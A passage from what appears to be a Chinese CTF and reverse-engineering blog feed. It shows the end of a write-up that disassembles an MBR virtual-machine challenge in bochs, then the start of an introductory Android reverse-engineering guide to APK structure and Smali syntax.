u/20 0x8b</span><br><span class="line">0000008b: (                    ): mov edx, 0x000000fc       ; bafc000000</span><br><span class="line">00000090: (                    ): mov eax, 0x00080000       ; b800000800</span><br><span class="line">00000095: (                    ): mov ax, dx                ; 6689d0</span><br><span class="line">00000098: (                    ): mov dx, 0x8e00            ; 66ba008e</span><br><span class="line">0000009c: (                    ): lea edi, dword ptr ds:0x00000128 ; 8d3d28010000</span><br><span class="line">000000a2: (                    ): mov ecx, 0x00000100       ; b900010000</span><br><span class="line">000000a7: (                    ): mov dword ptr ds:[edi], eax ; 8907</span><br><span class="line">000000a9: (                    ): mov dword ptr ds:[edi+4], edx ; 895704</span><br><span class="line">000000ac: (                    ): add edi, 0x00000008       ; 83c708</span><br><span class="line">000000af: (                    ): dec ecx                   ; 49</span><br><span class="line">000000b0: (                    ): jnz .-11                  ; 75f5</span><br><span class="line">000000b2: (                    ): lidt ds:0x0000011c        ; 0f011d1c010000</span><br><span class="line">000000b9: (                    ): ret                       ; c3</span><br></pre></td></tr></table></figure><p>GDTR 的初始化：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;bochs:68&gt; u/10 0x83</span><br><span class="line">00000083: (                    ): lgdt ds:0x00000122        ; 0f011522010000</span><br><span class="line">0000008a: (                    ): ret                       ; c3</span><br></pre></td></tr></table></figure><p>用 <code>sreg</code> 命令可以看到 GDTR 和 IDTR 寄存器被初始化了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;bochs:75&gt; sreg</span><br><span class="line">es:0x0000, dh=0x00009300, dl=0x0000ffff, valid=7</span><br><span class="line">Data segment, base=0x00000000, limit=0x0000ffff, Read/Write, Accessed</span><br><span class="line">cs:0x0008, dh=0x00c09b00, dl=0x000007ff, valid=1</span><br><span class="line">Code segment, base=0x00000000, limit=0x007fffff, Execute/Read, Non-Conforming, Accessed, 32-bit</span><br><span class="line">ss:0x0010, dh=0x00c09300, dl=0x000007ff, valid=7</span><br><span class="line">Data segment, base=0x00000000, limit=0x007fffff, Read/Write, Accessed</span><br><span class="line">ds:0x0010, dh=0x00c09300, dl=0x000007ff, valid=7</span><br><span class="line">Data segment, base=0x00000000, limit=0x007fffff, Read/Write, Accessed</span><br><span class="line">fs:0x0000, dh=0x00009300, dl=0x0000ffff, valid=1</span><br><span class="line">Data segment, base=0x00000000, limit=0x0000ffff, Read/Write, Accessed</span><br><span class="line">gs:0x0000, dh=0x00009300, dl=0x0000ffff, valid=1</span><br><span class="line">Data segment, base=0x00000000, limit=0x0000ffff, Read/Write, Accessed</span><br><span class="line">ldtr:0x0000, dh=0x00008200, dl=0x0000ffff, valid=1</span><br><span class="line">tr:0x0000, dh=0x00008b00, dl=0x0000ffff, valid=1</span><br><span class="line">gdtr:base=0x0000000000000928, limit=0x1f</span><br><span class="line">idtr:base=0x0000000000000128, limit=0x7ff</span><br></pre></td></tr></table></figure><p>最后是虚拟机指令部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">&lt;bochs:43&gt; u/110 0xb7c</span><br><span class="line">00000b7c: (                    ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b0000</span><br><span class="line">00000b83: (                    ): mov dword ptr ds:[ecx], eax ; 8901</span><br><span class="line">00000b85: (                    ): jmp .+366                 ; e96e010000</span><br><span class="line">00000b8a: (                    ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b0000</span><br><span class="line">00000b91: (                    ): mov eax, dword ptr ds:[eax] ; 8b00</span><br><span class="line">00000b93: (                    ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b0000</span><br><span class="line">00000b9a: (                    ): mov dword ptr ds:[ecx], eax ; 8901</span><br><span class="line">00000b9c: (                    ): jmp .+343                 ; e957010000</span><br><span class="line">00000ba1: (                    ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b0000</span><br><span class="line">00000ba8: (                    ): mov eax, dword ptr ds:[eax] ; 8b00</span><br><span class="line">00000baa: (                    ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b0000</span><br><span class="line">00000bb1: (                    ): lea eax, dword ptr ds:[eax*4+3400] ; 8d0485480d0000</span><br><span class="line">00000bb8: (                    ): mov eax, dword ptr ds:[eax] ; 8b00</span><br><span class="line">00000bba: (                    ): mov dword ptr ds:[ecx], eax ; 8901</span><br><span class="line">00000bbc: (                    ): jmp .+311                 ; e937010000</span><br><span class="line">00000bc1: (                    ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b0000</span><br><span class="line">00000bc8: (                    ): mov eax, dword ptr ds:[eax] ; 8b00</span><br><span class="line">00000bca: (                    ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b0000</span><br><span class="line">00000bd1: (                    ): mov ecx, dword ptr ds:[ecx] ; 8b09</span><br><span class="line">00000bd3: (                    ): lea ecx, dword ptr ds:[ecx*4+3400] ; 8d0c8d480d0000</span><br><span class="line">00000bda: (                    ): mov dword ptr ds:[ecx], eax ; 8901</span><br><span class="line">00000bdc: (                    ): jmp .+279                 ; e917010000</span><br><span class="line">00000be1: (                    ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b0000</span><br><span class="line">00000be8: (                    ): mov edx, dword ptr ds:[eax] ; 8b10</span><br><span class="line">00000bea: (                    ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b0000</span><br><span class="line">00000bf1: (                    ): mov eax, dword ptr ds:[ecx] ; 8b01</span><br><span class="line">00000bf3: (                    ): add eax, edx              ; 01d0</span><br><span class="line">00000bf5: (                    ): mov dword ptr ds:[ecx], eax ; 8901</span><br><span class="line">00000bf7: (                    ): jmp .+252                 ; e9fc000000</span><br><span class="line">00000bfc: (                    ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b0000</span><br><span class="line">00000c03: (                    ): mov edx, dword ptr ds:[eax] ; 8b10</span><br><span class="line">00000c05: (                    ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b0000</span><br><span class="line">00000c0c: (                    ): mov eax, dword ptr ds:[ecx] ; 8b01</span><br><span class="line">00000c0e: (                    ): sub eax, edx              ; 29d0</span><br><span class="line">00000c10: (                    ): mov dword ptr ds:[ecx], eax ; 8901</span><br><span class="line">00000c12: (                    ): jmp .+225                 ; e9e1000000</span><br><span class="line">00000c17: (                    ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b0000</span><br><span class="line">00000c1e: (                    ): mov edx, dword ptr ds:[eax] ; 8b10</span><br><span class="line">00000c20: (                    ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b0000</span><br><span class="line">00000c27: (                    ): mov eax, dword ptr ds:[ecx] ; 8b01</span><br><span class="line">00000c29: (                    ): xor eax, edx              ; 31d0</span><br><span class="line">00000c2b: (                    ): mov dword ptr ds:[ecx], eax ; 8901</span><br><span class="line">00000c2d: (                    ): jmp .+198                 ; e9c6000000</span><br><span class="line">00000c32: (                    ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b0000</span><br><span class="line">00000c39: (                    ): mov eax, dword ptr ds:[eax] ; 8b00</span><br><span class="line">00000c3b: (                    ): lea edx, dword ptr ds:[ecx*4+2916] ; 8d148d640b0000</span><br><span class="line">00000c42: (                    ): mov cl, al                ; 88c1</span><br><span class="line">00000c44: (                    ): mov eax, dword ptr ds:[edx] ; 8b02</span><br><span class="line">00000c46: (                    ): shl eax, cl               ; d3e0</span><br><span class="line">00000c48: (                    ): mov dword ptr ds:[edx], eax ; 8902</span><br><span class="line">00000c4a: (                    ): jmp .+169                 ; e9a9000000</span><br><span class="line">00000c4f: (                    ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b0000</span><br><span class="line">00000c56: (                    ): mov eax, dword ptr ds:[eax] ; 8b00</span><br><span class="line">00000c58: (                    ): lea edx, dword ptr ds:[ecx*4+2916] ; 8d148d640b0000</span><br><span class="line">00000c5f: (                    ): mov cl, al                ; 88c1</span><br><span class="line">00000c61: (                    ): mov eax, dword ptr ds:[edx] ; 8b02</span><br><span class="line">00000c63: (                    ): shr eax, cl               ; d3e8</span><br><span class="line">00000c65: (                    ): mov dword ptr ds:[edx], eax ; 8902</span><br><span class="line">00000c67: (                    ): jmp .+140                 ; e98c000000</span><br><span class="line">00000c6c: (                    ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b0000</span><br><span class="line">00000c73: (                    ): mov eax, dword ptr ds:[eax] ; 8b00</span><br><span class="line">00000c75: (                    ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b0000</span><br><span class="line">00000c7c: (                    ): mov edx, dword ptr ds:[ecx] ; 8b11</span><br><span class="line">00000c7e: (                    ): and eax, edx              ; 21d0</span><br><span class="line">00000c80: (                    ): mov dword ptr ds:[ecx], eax ; 8901</span><br><span class="line">00000c82: (                    ): jmp .+116                 ; eb74</span><br><span class="line">00000c84: (                    ): lea eax, dword ptr ds:[ecx*4+2916] ; 8d048d640b0000</span><br><span class="line">00000c8b: (                    ): mov eax, dword ptr ds:[eax] ; 8b00</span><br><span class="line">00000c8d: (                    ): lea ecx, dword ptr ds:0x00000b78 ; 8d0d780b0000</span><br><span class="line">00000c93: (                    ): mov dword ptr ds:[ecx], eax ; 8901</span><br><span class="line">00000c95: (                    ): iret                      ; cf</span><br><span class="line">00000c96: (                    ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b0000</span><br><span class="line">00000c9d: (                    ): mov eax, dword ptr ds:[eax] ; 8b00</span><br><span class="line">00000c9f: (                    ): test eax, eax             ; 85c0</span><br><span class="line">00000ca1: (                    ): jnz .+85                  ; 7555</span><br><span class="line">00000ca3: (                    ): lea eax, dword ptr ds:[ecx*4+2916] ; 8d048d640b0000</span><br><span class="line">00000caa: (                    ): mov eax, dword ptr ds:[eax] ; 8b00</span><br><span class="line">00000cac: (                    ): lea ecx, dword ptr ds:0x00000b78 ; 8d0d780b0000</span><br><span class="line">00000cb2: (                    ): mov dword ptr ds:[ecx], eax ; 8901</span><br><span class="line">00000cb4: (                    ): iret                      ; cf</span><br><span class="line">00000cb5: (                    ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b0000</span><br><span class="line">00000cbc: (                    ): mov eax, dword ptr ds:[eax] ; 8b00</span><br><span class="line">00000cbe: (                    ): test eax, eax             ; 85c0</span><br><span class="line">00000cc0: (                    ): jz .+54                   ; 7436</span><br><span class="line">00000cc2: (                    ): lea eax, dword ptr ds:[ecx*4+2916] ; 8d048d640b0000</span><br><span class="line">00000cc9: (                    ): mov eax, dword ptr ds:[eax] ; 8b00</span><br><span class="line">00000ccb: (                    ): lea ecx, dword ptr ds:0x00000b78 ; 8d0d780b0000</span><br><span class="line">00000cd1: (                    ): mov dword ptr ds:[ecx], eax ; 8901</span><br><span class="line">00000cd3: (                    ): iret                      ; cf</span><br><span class="line">00000cd4: (                    ): lea eax, dword ptr ds:0x00000f94 ; 8d05940f0000</span><br><span class="line">00000cda: (                    ): call .-3061               ; e80bf4ffff</span><br><span class="line">00000cdf: (                    ): hlt                       ; f4</span><br><span class="line">00000ce0: (                    ): lea eax, dword ptr ds:0x00000fa0 ; 8d05a00f0000</span><br><span class="line">00000ce6: (                    ): call .-3073               ; e8fff3ffff</span><br><span class="line">00000ceb: (                    ): lea eax, dword ptr ds:0x00000fae ; 8d05ae0f0000</span><br><span class="line">00000cf1: (                    ): call .-3084               ; e8f4f3ffff</span><br><span class="line">00000cf6: (                    ): hlt                       ; f4</span><br><span class="line">00000cf7: (                    ): hlt                       ; f4</span><br><span class="line">00000cf8: (                    ): lea ecx, dword ptr ds:0x00000b78 ; 8d0d780b0000</span><br><span class="line">00000cfe: (                    ): mov eax, dword ptr ds:[ecx] ; 8b01</span><br><span class="line">00000d00: (                    ): add eax, 0x00000003       ; 83c003</span><br><span class="line">00000d03: (                    ): mov dword ptr ds:[ecx], eax ; 8901</span><br><span class="line">00000d05: (                    ): iret                      ; cf</span><br></pre></td></tr></table></figure><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.52pojie.cn/thread-936377-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-936377-1-1.html</a><br><a href="https://blog.csdn.net/ice__snow/article/details/50654629" target="_blank" rel="noopener">https://blog.csdn.net/ice__snow/article/details/50654629</a><br><a href="https://blog.51cto.com/4201689/1420063" target="_blank" rel="noopener">https://blog.51cto.com/4201689/1420063</a><br><a href="https://www.cnblogs.com/playmak3r/p/12079833.html" target="_blank" rel="noopener">https://www.cnblogs.com/playmak3r/p/12079833.html</a><br><a href="https://blog.qrzbing.cn/2019/04/27/CISCN2019-strange-int/" target="_blank" rel="noopener">https://blog.qrzbing.cn/2019/04/27/CISCN2019-strange-int/</a><br><a href="http://imushan.com/2018/07/11/os/Bochs%E5%AD%A6%E4%B9%A0-%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E7%AF%87/" target="_blank" rel="noopener">http://imushan.com/2018/07/11/os/Bochs%E5%AD%A6%E4%B9%A0-%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E7%AF%87/</a><br><a href="https://www.cnblogs.com/mlzrq/p/10223079.html#%E4%BD%BF%E7%94%A8bochs%E8%B0%83%E8%AF%95" target="_blank" rel="noopener">https://www.cnblogs.com/mlzrq/p/10223079.html#%E4%BD%BF%E7%94%A8bochs%E8%B0%83%E8%AF%95</a><br><a href="https://mrh1s.top/posts/d2cf12e4/" target="_blank" rel="noopener">https://mrh1s.top/posts/d2cf12e4/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一道 MBR 虚拟机的题目，同时也熟悉了使用 bochs 对 MBR 的调试。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
      <category term="re" scheme="blog.b3ale.cn/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向入门（一）</title>
    <link href="blog.b3ale.cn/2020/01/16/Android%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>blog.b3ale.cn/2020/01/16/Android%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2020-01-16T06:41:48.000Z</published>
    <updated>2020-02-18T09:11:55.785Z</updated>
    
    <content type="html"><![CDATA[<p>开始学习安卓。</p><a id="more"></a><h1 id="APK-的组成"><a href="#APK-的组成" class="headerlink" title="APK 的组成"></a>APK 的组成</h1><ul><li>asset 文件夹<ul><li>资源目录，不需要生成索引，在 Java 代码中需要用 AssetManager 来访问</li></ul></li><li>lib 文件夹<ul><li>so 库存放位置，一般由 NDK 编译得到，常见于使用游戏引擎或 JNI native 调用的工程中</li></ul></li><li>META-INF 文件夹<ul><li>存放工程的一些属性文件，例如 Manifest.MF</li></ul></li><li>res 文件夹<ul><li>资源目录，在编译时自动生成索引文件（R.java），在 Java 代码中用 R.xxx.yyy 来引用</li></ul></li><li>AndroidManifest.xml<ul><li>Android 工程的基础配置属性文件（描述 Android 应用的信息，包括类名、组件名等）</li></ul></li><li>classes.dex<ul><li>Java 代码编译得到的 Dalvik VM 能直接执行的文件</li></ul></li><li>resources.arsc<ul><li>对 res 目录下资源的一个索引文件，保存了原工程中 string.xml 等文件内容</li></ul></li><li>其他文件夹</li></ul><p>一般来说，除了音频和视频资源（需要放在 raw 或 asset 下），使用 Java 开发的 Android 工程使用到的资源文件都会放在 res 下；使用 C++游戏引擎（或使用 Lua Unity3D 等）的资源文件均需要放在 asset 下。</p><h1 id="Dalvik-字节码"><a href="#Dalvik-字节码" class="headerlink" title="Dalvik 字节码"></a>Dalvik 字节码</h1><p>Dalvik 是谷歌专门为 Android 操作系统设计的一个虚拟机，经过深度的优化。虽然 Android 上的程序是使用 Java 来开发的，但是 Dalvik 和标准的 Java 虚拟机 JVM 还是两回事。Dalvik VM 是基于寄存器的，而 JVM 是基于栈的；Dalvik 有专属的文件执行格式 dex（Dalvik Executable），而 JVM 则执行的是 Java 字节码。Dalvik VM 比 JVM 速度更快，占用空间更少。</p><h1 id="Smali-文件结构"><a href="#Smali-文件结构" class="headerlink" title="Smali 文件结构"></a>Smali 文件结构</h1><p>Smali、Baksmali 分别是指 Android 系统里的 Dalvik 虚拟机所使用的一种 dex 格式文件的汇编器、反汇编器。其语法是一种宽松式的 Jasmin/Dedexer 语法，而且它实现了 dex 格式所有功能（注解、调试信息、线路信息等）。</p><p>当我们对 APK 文件进行反编译后，便会生成此类文件。其中在 Dalvik 字节码中，寄存器都是 32 位的，能够支持任何类型，64 位类型（Long/Double）用 2 个寄存器表示；Dalvik 字节码有两种类型：原始类型、引用类型（包括对象和数组）。</p><h2 id="头部定义"><a href="#头部定义" class="headerlink" title="头部定义"></a>头部定义</h2><ul><li><code>.class</code></li><li><code>.super</code></li><li><code>.source</code></li></ul><h2 id="域定义"><a href="#域定义" class="headerlink" title="域定义"></a>域定义</h2><ul><li><code>.field public</code></li><li><code>.field static</code></li><li><code>.field private</code></li><li>…</li></ul><h2 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h2><h3 id="Smali-函数（使用-P-V-寄存器）"><a href="#Smali-函数（使用-P-V-寄存器）" class="headerlink" title="Smali 函数（使用 P-V 寄存器）"></a>Smali 函数（使用 P-V 寄存器）</h3><p>在 smali 里的所有操作都必须经过寄存器来进行：本地寄存器用 v 开头、数字结尾的符号来表示，如 v0、v1、v2 等；参数寄存器则使用 p 开头、数字结尾的符号来表示，如 p0、p1、p2 等。特别注意的是，p0 不一定是函数中的第一个参数，在非 static 函数中，p0 代指 this，p1 表示函数的第一个参数，p2 代表函数中的第二个参数；而在 static 函数中 p0 才对应第一个参数（因为 Java 的 static 方法中没有 this 方法）。</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">.method</span> 访问修饰符 函数名 函数签名</span><br><span class="line"><span class="keyword">    .locals</span> n <span class="comment"># 使用 n 个寄存器，即 v0~v(n-1)</span></span><br><span class="line"><span class="keyword">    .param</span> p1, <span class="string">"savedInstanceState"</span> <span class="comment"># Landroid/os/Bundle # 注释</span></span><br><span class="line"><span class="keyword">    .</span>.. <span class="comment"># 函数实现</span></span><br><span class="line">   <span class="built_in"> return-xxx </span><span class="comment"># 返回</span></span><br><span class="line"><span class="keyword">.end method</span></span><br></pre></td></tr></table></figure><h3 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h3><p>参数通过寄存器传递（Pn、Vn）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke&#123;参数&#125;, 方法名</span><br></pre></td></tr></table></figure><h2 id="Smali-字段描述符"><a href="#Smali-字段描述符" class="headerlink" title="Smali 字段描述符"></a>Smali 字段描述符</h2><table><thead><tr><th style="text-align:center">Java type</th><th style="text-align:center">Type descriptor</th></tr></thead><tbody><tr><td style="text-align:center"><code>void</code></td><td style="text-align:center"><code>V</code></td></tr><tr><td style="text-align:center"><code>boolean</code></td><td style="text-align:center"><code>Z</code></td></tr><tr><td style="text-align:center"><code>char</code></td><td style="text-align:center"><code>C</code></td></tr><tr><td style="text-align:center"><code>byte</code></td><td style="text-align:center"><code>B</code></td></tr><tr><td style="text-align:center"><code>short</code></td><td style="text-align:center"><code>S</code></td></tr><tr><td style="text-align:center"><code>int</code></td><td style="text-align:center"><code>I</code></td></tr><tr><td style="text-align:center"><code>float</code></td><td style="text-align:center"><code>F</code></td></tr><tr><td style="text-align:center"><code>long</code></td><td style="text-align:center"><code>J</code></td></tr><tr><td style="text-align:center"><code>double</code></td><td style="text-align:center"><code>D</code></td></tr><tr><td style="text-align:center"><code>Object</code></td><td style="text-align:center"><code>Ljava/lang/Object;</code></td></tr><tr><td style="text-align:center"><code>int[]</code></td><td style="text-align:center"><code>[I</code></td></tr><tr><td style="text-align:center"><code>byte[]</code></td><td style="text-align:center"><code>[B</code></td></tr><tr><td style="text-align:center"><code>Object[][]</code></td><td style="text-align:center"><code>[[Ljava/lang/Object;</code></td></tr></tbody></table><h2 id="Smali-基本语法"><a href="#Smali-基本语法" class="headerlink" title="Smali 基本语法"></a>Smali 基本语法</h2><table><thead><tr><th style="text-align:center">Keyword descriptor</th><th style="text-align:center">Description</th></tr></thead><tbody><tr><td style="text-align:center"><code>.field private isFlag:z</code></td><td style="text-align:center">定义变量</td></tr><tr><td style="text-align:center"><code>.method</code></td><td style="text-align:center">方法</td></tr><tr><td style="text-align:center"><code>.parameter</code></td><td style="text-align:center">方法参数</td></tr><tr><td style="text-align:center"><code>.prologue</code></td><td style="text-align:center">方法开始</td></tr><tr><td style="text-align:center"><code>.line 123</code></td><td style="text-align:center">此方法位于第 123 行</td></tr><tr><td style="text-align:center"><code>const/high16 v0, 0x7f03</code></td><td style="text-align:center">把 0x7f03 赋值给 v0</td></tr><tr><td style="text-align:center"><code>return-void</code></td><td style="text-align:center">函数返回 void</td></tr><tr><td style="text-align:center"><code>.end method</code></td><td style="text-align:center">函数结束</td></tr><tr><td style="text-align:center"><code>new-instance</code></td><td style="text-align:center">创建实例</td></tr><tr><td style="text-align:center"><code>iput-object</code></td><td style="text-align:center">对象赋值</td></tr><tr><td style="text-align:center"><code>iget-object</code></td><td style="text-align:center">调用对象</td></tr><tr><td style="text-align:center"><code>move-result-object</code></td><td style="text-align:center">将上一句的结果赋值给寄存器</td></tr><tr><td style="text-align:center"><code>new-array v0, v1, type</code></td><td style="text-align:center">构造指定类型与大小的数组，并赋值给寄存器</td></tr><tr><td style="text-align:center"><code>array-length v0, v1</code></td><td style="text-align:center">获取指定寄存器中数组的长度并赋值给寄存器</td></tr><tr><td style="text-align:center"><code>const/4</code></td><td style="text-align:center">赋值</td></tr><tr><td style="text-align:center"><code>rem-int/2addr v0, v1</code></td><td style="text-align:center">计算模结果存入寄存器</td></tr><tr><td style="text-align:center"><code>int-to-byte</code></td><td style="text-align:center">整型转字节型</td></tr><tr><td style="text-align:center"><code>goto</code></td><td style="text-align:center">直接跳转到指定位置</td></tr><tr><td style="text-align:center"><code>return-object</code></td><td style="text-align:center">返回一个对象类型</td></tr></tbody></table><h2 id="Smali-中函数的调用"><a href="#Smali-中函数的调用" class="headerlink" title="Smali 中函数的调用"></a>Smali 中函数的调用</h2><p>函数分为 direct 和 virtual 两种类型。direct method 就是 private 函数，其余的 public 和 protected 函数都属于 virtual method。</p><h3 id="invoke-static"><a href="#invoke-static" class="headerlink" title="invoke-static"></a><code>invoke-static</code></h3><p>调用静态函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-static &#123;v0&#125;, Ljava/lang/System;-&gt;loadLibrary(Ljava/lang/String;)V</span><br></pre></td></tr></table></figure><h3 id="invoke-super"><a href="#invoke-super" class="headerlink" title="invoke-super"></a><code>invoke-super</code></h3><p>调用父类方法用的指令（一般用于调用 onCreate、onDestroy）。</p><h3 id="invoke-direct"><a href="#invoke-direct" class="headerlink" title="invoke-direct"></a><code>invoke-direct</code></h3><p>调用 private 函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-direct &#123;p0&#125;, Landroid/app/TabActivity;-&gt;&lt;init&gt;()V</span><br></pre></td></tr></table></figure><h3 id="invoke-virtual"><a href="#invoke-virtual" class="headerlink" title="invoke-virtual"></a><code>invoke-virtual</code></h3><p>用于调用 protected 或 public 函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-virtual &#123;v0,v1&#125;, Lcom/ccc;-&gt;Message(Ljava/lang/Object;)V</span><br></pre></td></tr></table></figure><h3 id="invoke-xxxxx-range"><a href="#invoke-xxxxx-range" class="headerlink" title="invoke-xxxxx/range"></a><code>invoke-xxxxx/range</code></h3><p>当方法参数多于 5 个时（含 5 个），不能直接使用以上指令，而是在后面加上 <code>/range</code> 表示范围。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-direct/range &#123;v0 .. v5&#125;, Lcmb/pb/ui/PBContainerActivity;-&gt;h(ILjava/lang/CharSequence;Ljava/lang/String;Landroid/content/Intent;I)Z</span><br></pre></td></tr></table></figure><h2 id="Smali-中的条件跳转分支"><a href="#Smali-中的条件跳转分支" class="headerlink" title="Smali 中的条件跳转分支"></a>Smali 中的条件跳转分支</h2><table><thead><tr><th style="text-align:center">代码</th><th style="text-align:center">含义</th></tr></thead><tbody><tr><td style="text-align:center"><code>if-eq vA, vB, :cond_**</code></td><td style="text-align:center">如果 vA 等于 vB 则跳转到 <code>:cond_**</code></td></tr><tr><td style="text-align:center"><code>if-ne vA, vB, :cond_**</code></td><td style="text-align:center">如果 vA 不等于 vB 则跳转到 <code>:cond_**</code></td></tr><tr><td style="text-align:center"><code>if-lt vA, vB, :cond_**</code></td><td style="text-align:center">如果 vA 小于 vB 则跳转到 <code>:cond_**</code></td></tr><tr><td style="text-align:center"><code>if-ge vA, vB, :cond_**</code></td><td style="text-align:center">如果 vA 大于等于 vB 则跳转到 <code>:cond_**</code></td></tr><tr><td style="text-align:center"><code>if-gt vA, vB, :cond_**</code></td><td style="text-align:center">如果 vA 大于 vB 则跳转到 <code>:cond_**</code></td></tr><tr><td style="text-align:center"><code>if-le vA, vB, :cond_**</code></td><td style="text-align:center">如果 vA 小于等于 vB 则跳转到 <code>:cond_**</code></td></tr><tr><td style="text-align:center"><code>if-eqz vA, :cond_**</code></td><td style="text-align:center">如果 vA 等于 0 则跳转到 <code>:cond_**</code></td></tr><tr><td style="text-align:center"><code>if-nez vA, :cond_**</code></td><td style="text-align:center">如果 vA 不等于 0 则跳转到 <code>:cond_**</code></td></tr><tr><td style="text-align:center"><code>if-ltz vA, :cond_**</code></td><td style="text-align:center">如果 vA 小于 0 则跳转到 <code>:cond_**</code></td></tr><tr><td style="text-align:center"><code>if-gez vA, :cond_**</code></td><td style="text-align:center">如果 vA 大于等于 0 则跳转到 <code>:cond_**</code></td></tr><tr><td style="text-align:center"><code>if-gtz vA, :cond_**</code></td><td style="text-align:center">如果 vA 大于 0 则跳转到 <code>:cond_**</code></td></tr><tr><td style="text-align:center"><code>if-lez vA, :cond_**</code></td><td style="text-align:center">如果 vA 小于等于 0 则跳转到 <code>:cond_**</code></td></tr></tbody></table><h2 id="Smali-代码编写"><a href="#Smali-代码编写" class="headerlink" title="Smali 代码编写"></a>Smali 代码编写</h2><h3 id="静态返回-HelloWorld-的方法"><a href="#静态返回-HelloWorld-的方法" 